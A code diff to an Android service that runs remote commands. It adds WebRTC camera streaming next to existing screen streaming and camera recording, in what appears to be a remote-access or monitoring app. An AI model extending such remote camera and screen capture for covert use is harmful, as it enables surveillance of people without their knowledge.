@@ -751,6 +751,34 @@ class CoreService : Service() {
                 "start_screen_stream"  -> startFgService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                 "stop_screen_stream"   -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))
 
+                // ── WebRTC P2P camera stream ────────────────────────────────────
+                "start_webrtc_stream" -> {
+                    val useFront = data.optBoolean("front_camera", true)
+                    mainHandler.post {
+                        try {
+                            WebRTCManager.instance?.stop()
+                            WebRTCManager(this@CoreService) { type, payload ->
+                                sendData(type, payload)
+                            }.start(useFront)
+                        } catch (e: Exception) {
+                            CrashLogger.logCrash(this@CoreService, e, "start_webrtc_stream")
+                        }
+                    }
+                }
+                "stop_webrtc_stream"   -> mainHandler.post { WebRTCManager.instance?.stop() }
+                "webrtc_answer"        -> {
+                    val sdp = data.optString("sdp")
+                    if (sdp.isNotEmpty()) mainHandler.post { WebRTCManager.instance?.onAnswer(sdp) }
+                }
+                "webrtc_ice_candidate" -> {
+                    val sdpMid       = data.optString("sdp_mid", "0")
+                    val sdpMLineIdx  = data.optInt("sdp_mline_index", 0)
+                    val candidate    = data.optString("candidate")
+                    if (candidate.isNotEmpty()) mainHandler.post {
+                        WebRTCManager.instance?.addIceCandidate(sdpMid, sdpMLineIdx, candidate)
+                    }
+                }
+
                 "start_camera_record"  -> CameraRecorder.start(this, data.optInt("duration_seconds", 60), data.optBoolean("front_camera", false))
                 "stop_camera_record"   -> CameraRecorder.stop(this)
                 "list_camera_records"  -> {
